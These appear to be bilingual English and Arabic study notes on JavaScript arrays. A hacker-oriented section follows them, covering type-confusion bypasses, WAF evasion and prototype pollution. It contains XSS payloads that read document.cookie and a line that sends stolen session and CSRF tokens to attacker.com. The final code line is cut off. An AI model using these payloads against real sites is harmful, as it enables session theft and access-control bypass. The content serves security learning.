5. Arrays & Nested Arrays in JavaScript

Definition:
An array is an ordered collection of elements (not limited to numbers; can hold strings, booleans, objects, or other arrays).

Syntax & Declarations:
- Empty Array: const myArr = [];
- String Array: const myArr = ["fady", "basem", "zaky"]; // Strings must be enclosed in quotes
- Mixed Array: const mixedArr = [1, "silentn0va", true, null]; // JS allows mixing data types

Accessing Array Elements:
- Indexing starts at 0:
  console.log(myArr[0]); // Output: "fady"

Nested Arrays (Multi-Dimensional Arrays):
- An array containing other arrays as elements:
  const nestedArr = [
    ["fady", "basem"],
    ["zaky", "nova"]
  ];

Accessing Nested Elements:
- Use multiple bracket notations [row][column]:
  console.log(nestedArr[0][0]); // Output: "fady"
  console.log(nestedArr[1][0]); // Output: "zaky"

---


### (JS Core Concept)

المصفوفات (**Arrays**) هي هيكل بيانات بيسمحلك تخزن مجاميع مرتبة من البيانات في متغير واحد بدل ما تعمل متغير لكل قيمة.

- **المرونة وتنوع البيانات:** المصفوفة في JS مش مقتصرة على الأرقام بس؛ تقدر تخزن فيها نصوص، أرقام، قيم منطقية، أو حتى أوبجكتس ومصفوفات تانية في نفس الوقت.
    
- **الفهرسة (Indexing):** عناصر المصفوفة مرتبة بأرقام تبدأ من Zero (`0`). أول عنصر هو `myArr[0]`.
    
- **المصفوفات المتداخلة (Nested Arrays):** مصفوفة جواها مصفوفات تانية (عاملة زي الجدول صفوف وأعمدة).
    
- **طريقة الوصول لعنصر متداخل:** بنستخدم القوسين مرتين `nestedArr[x][y]`:
    
    - الرقم الأول `[x]` بيحدد المصفوفة الخارجية (الصف).
        
    - الرقم الثاني `[y]` بيحدد العنصر جوه المصفوفة الداخلية (العمود).
        

### 3. 💻 مثال برمجي تقليدي (Standard Example)

JavaScript

```
// Mixed Array
const userData = ["silentn0va", 25, true]; 
console.log("Username:", userData[0]); // "silentn0va"

// Nested Array (Multi-dimensional)
const matrix = [
    ["User1", "Admin"],
    ["User2", "Guest"]
];

console.log(matrix[0][0]); // "User1"
console.log(matrix[0][1]); // "Admin"
console.log(matrix[1][1]); // "Guest"
```

### 4. ⚔️ منظور الهكر (JS for Hackers)

المصفوفات وطريقة تعامل JS معاها من أمتع الأهداف للهكر، وبتتسبب في ثغرات منطقية وتجاوزات خطيرة:

1. **الارتباك في أنواع البيانات (Type Confusion / Loose Comparison Bypass):**
    
    - لما الصرف في JS يعمل مقارنة ضعيفة (`==`) بين String و Array، المتصفح بيحول المصفوفة لـ String تلقائياً عبر `.toString()`.
        
    - لو التطبيق بيتحقق من إدخال معين وحقنت Array بدل String، تقدر تتجاوز شروط حماية كتيرة (Logic Bypasses)!
        
2. **التجاوز بالتسلسل وتحويل الأنوع في الـ XSS (Implicit Array Coercion):**
    
    - دمج المصفوفات مع الرموز مثل `+` بيحذف الأقواس ويحول عناصر المصفوفة لنص مفصول بفاصلة.
        
    - الهكر بيستغل سلوك المصفوفات ده للالتفاف حول الـ WAFs التي تمنع الفواصل أو المسافات أو الكلمات المفتاحية.
        
3. **التلاعب بالخصائص وعناصر الـ Prototype (Array Prototype Pollution):**
    
    - جميع المصفوفات بتورث من `Array.prototype`. لو قدر المهاجم يلوث الـ Prototype بتاع الـ Arrays، أي مصفوفة في التطبيق سينزل فيها الخصائص المحقونة دي مجاناً، وده بيمهد لـ Remote Code Execution (RCE) أو DOM XSS.
        
4. **تجاوز فلاتر الـ JSON / APIs (Parameter Pollution via JSON Arrays):**
    
    - لو الـ API متوقع منك حقل بياخد نص زي `"role": "user"`، لكن بعتله Array زي `"role": ["admin", "user"]` أو `"role": ["user"]`؛ بعض الـ Parsers بياخدوا أول قيمة في المصفوفة والبعض بياخد آخر قيمة، وده بيسبب اختلاف بين حماية الـ WAF والـ Backend (Impedance Mismatch).
        

### 5. 🎯 أمثلة هجومية وسيناريوهات استغلال (PoC & Payloads)

#### 📌 السيناريو الأول: تجاوز شرط الأمان بـ Type Confusion (`==`)

تخيل كود فحص الصلاحيات بيتحقق من الباسورد أو الـ Token كدة:

JavaScript

```
// كود تطبيق ضعيف يستخدم المقارنة الضعيفة ==
function verifyToken(userInputToken) {
    const validToken = "SECRET_12345";
    
    // لو مدخلات المستخدم طابقت التوكين
    if (userInputToken == validToken) {
        return "Access Granted!";
    }
    return "Access Denied!";
}
```

- **طريقة الاستغلال:** إذا قدر المهاجم يبعت Input على شكل Array محتواها النص المطلوبة:
    
    JavaScript
    
    ```
    const payload = ["SECRET_12345"];
    
    // في JS: ["SECRET_12345"] == "SECRET_12345" بتعطي true!
    console.log(verifyToken(payload)); // النتيجة: Access Granted!
    ```
    

#### 📌 السيناريو الثاني: استخدام المصفوفات لتشغيل XSS بدون استخدام نقط أو فواصل

تجاوز فلتر WAF بيمسح المسافات والأقواس العادية من الكود:

JavaScript

```
// كود عادي يتم كشفه: alert(document.cookie)

// Payload باستخدام Arrays للتخفي:
[alert][0](document.cookie);

// أو تحويل Array لـ String للتشغيل الضمني:
[1, 2]["map"](alert); // سيعرض alert لكل عنصر
```

#### 📌 السيناريو الثالث: استخراج البيانات الحساسة من Nested Arrays في الـ DOM

تخيل موقع بتخزن بيانات المستخدمين أو البطاقات في هيكل بيانات متداخل في الـ Client-Side:

JavaScript

```
// بيانات الضحايا المخزنة في DOM
const sessionData = [
    ["session_id", "sess_abc123456"],
    ["csrf_token", "token_987654321"]
];

// Payload حقن XSS لسحب الـ Tokens من المصفوفة المتداخلة إرسالها للهكر:
const stolenSession = sessionData[0][1]; // sess_abc123456
const stolenCSRF = sessionData[1][1];    // token_987654321

new Image().src = `https://attacker.com/steal?sess=${stolenSession}
```
